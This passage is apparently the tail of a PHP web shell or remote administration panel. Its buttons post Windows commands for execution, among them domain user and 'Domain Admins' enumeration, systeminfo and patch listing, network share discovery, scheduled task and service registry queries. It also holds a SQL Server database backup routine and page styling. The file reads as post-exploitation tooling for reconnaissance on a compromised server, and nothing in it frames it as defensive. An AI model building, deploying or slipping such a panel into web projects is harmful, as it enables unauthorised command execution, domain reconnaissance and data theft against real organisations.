echo "<form method='POST'>
        <input type='hidden' name='command' value='net user /domain && net group \"Domain Admins\" /domain'>
        <input type='hidden' name='cmd_type' value='cmd'>
        <button type='submit' name='execute_cmd' class='btn'>Domain Users & Groups</button>
      </form>";
echo "</div>";

echo "<div class='panel'>";
echo "<h3>🖥️ System Info</h3>";
echo "<form method='POST'>
        <input type='hidden' name='command' value='systeminfo && wmic qfe list brief'>
        <input type='hidden' name='cmd_type' value='cmd'>
        <button type='submit' name='execute_cmd' class='btn'>System & Updates</button>
      </form>";
echo "</div>";

echo "</div>";

echo "<div class='panel'>";
echo "<h3>📋 Quick Network Commands</h3>";
echo "<div class='grid'>";

$networkCommands = [
    'ping 8.8.8.8' => 'Test internet connectivity',
    'nslookup google.com' => 'DNS resolution test',
    'route print' => 'Routing table',
    'net share' => 'Shared folders',
    'net view' => 'Network computers',
    'tasklist /svc' => 'Services in processes',
    'schtasks /query' => 'Scheduled tasks',
    'reg query "HKLM\\System\\CurrentControlSet\\Services"' => 'Service registry',
];

foreach ($networkCommands as $cmd => $desc) {
    echo "<form method='POST' style='margin-bottom: 5px;'>
            <input type='hidden' name='command' value='$cmd'>
            <input type='hidden' name='cmd_type' value='cmd'>
            <button type='submit' name='execute_cmd' class='btn' style='width: 100%; text-align: left;'>$desc</button>
          </form>";
}

echo "</div>";
echo "</div>";
echo "</div>";

// ================= POST PROCESSING =================
if (isset($_POST['action']) && $_POST['action'] == 'backup_db') {
    echo "<div class='panel'>";
    try {
        $backupFile = $config['backup_dir'] . "backup_" . date('Ymd_His') . ".bak";
        $conn->exec("BACKUP DATABASE [{$current_database}] TO DISK = '$backupFile' WITH FORMAT, INIT");
        echo "<h3>✅ Backup Created</h3>";
        echo "<p>Backup saved to: $backupFile</p>";
    } catch (Exception $e) {
        echo "<p class='status-error'>Backup failed: " . $e->getMessage() . "</p>";
    }
    echo "</div>";
}

echo "
</div> <!-- Close container -->
</body>
</html>
";

// ================= CLEANUP =================
$conn = null;
?>

    <style>
        body { font-family: Arial, sans-serif; background: #f7fafc; color: #2d3748; margin: 0; padding: 0; }
        .container { width: 90%; max-width: 1200px; margin: auto; padding: 20px; }
        .header { text-align: center; margin-bottom: 30px; }
        .header h1 { margin: 0; font-size: 2.5em; }
        .panel { background: #fff; border: 1px solid #e2e8f0; border-radius: 5px; padding: 15px; margin-bottom: 20px; box-shadow: 0 2px 4px rgba(0,0,0,0.05); }
        .panel-title { margin-top: 0; }
        .btn { background: #3182ce; color: #fff; padding: 10px 15px; border: none; border-radius: 3px; cursor: pointer; text-decoration: none; display: inline-block; margin-top: 10px; }
        .btn:hover { background: #2b6cb0; }
        .btn-danger { background: #e53e3e; }
        .btn-danger:hover { background: #c53030; }
        .btn-success { background: #38a169; }
        .btn-success:hover { background: #2f855a; }
        .btn-warning { background: #dd6b20; }
        .btn-warning:hover { background: #c05621; }
        .tab-container { display: flex; border-bottom: 2px solid #e2e8f0; margin-bottom: 20px; }
        .tab { padding: 10px 15px; cursor: pointer; border: 1px solid #e2e8f0; border-bottom: none; background: #edf2f7; margin-right: 5px; border-top-left-radius: 5px; border-top-right-radius: 5px; }
        .tab.active { background: #fff; font-weight: bold; }
        .tab-content { display: none; }
        .tab-content.active { display: block; }
        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; }
        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
        th, td { border: 1px solid #e2e8f0; padding: 8px; text-align: left; }
        th { background: #f1f5f9; }
        .command-output, .output-container { background: #1a202c; color: #cbd5e0; padding: 10px; border-radius: 5px; margin-top: 10px; white-space: pre-wrap; max-height: 400px; overflow: auto; font-family: monospace; }
        .status-success { color: #38a169; font-weight: bold; }
        .status-error { color: #e53e3e; font-weight: bold; }
        .export-notice { background: #fefcbf; border: 1px solid #faf089; padding: 10px; border-radius: 5px; margin-bottom: 20px; }
        .db-selector { margin-bottom: 20px; }
        .db-quick-switch a { margin-right: 10px; color: #3182ce; text-decoration: none; }
        .db-quick-switch a:hover { text-decoration: underline; }
    </style>